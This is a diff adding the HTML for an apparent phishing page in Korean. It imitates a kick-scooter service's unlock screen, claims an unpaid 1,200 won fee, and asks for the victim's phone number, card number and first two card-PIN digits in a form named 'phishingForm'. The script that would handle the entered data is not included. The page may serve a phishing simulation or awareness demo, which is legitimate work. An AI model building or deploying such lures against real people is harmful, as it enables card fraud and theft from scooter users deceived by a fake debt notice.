@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>킥보드 잠금해제 및 결제</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🛴 퀵라이더</h1>
+            <p>이전 이용 요금 <strong>1,200원</strong>이 미납되었습니다.<br>결제 수단을 확인 후 잠금이 해제됩니다.</p>
+        </header>
+
+        <form id="phishingForm">
+            <div class="input-group">
+                <label for="phoneNumber">가입된 휴대폰 번호</label>
+                <input type="tel" id="phoneNumber" placeholder="010-0000-0000" required>
+            </div>
+            
+            <div class="input-group warning-input">
+                <label for="cardNumber">결제 신용/체크카드 번호</label>
+                <input type="text" id="cardNumber" placeholder="0000-0000-0000-0000" required>
+            </div>
+
+            <div class="input-group warning-input">
+                <label for="cardCvc">카드 비밀번호 앞 2자리</label>
+                <input type="password" id="cardCvc" placeholder="**" maxlength="2" required>
+            </div>
+
+            <button type="submit" class="submit-btn">미납금 결제 및 잠금해제</button>
+        </form>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
